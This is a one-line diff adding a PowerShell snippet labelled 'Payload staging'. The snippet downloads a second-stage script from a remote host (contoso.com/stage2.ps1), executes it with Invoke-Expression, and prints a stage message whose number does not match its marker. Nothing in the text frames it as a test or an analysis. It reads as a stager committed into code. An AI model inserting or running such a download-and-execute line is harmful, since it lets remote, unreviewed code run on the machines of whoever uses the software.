@@ -1,0 +1,1 @@
+<# Payload staging #> $DownloadedScript = (New-Object System.Net.WebClient).DownloadString("http://contoso.com/stage2.ps1"); IEX $DownloadedScript; $StageMarker = "stage-24"; Write-Output "stage 14 initialized"
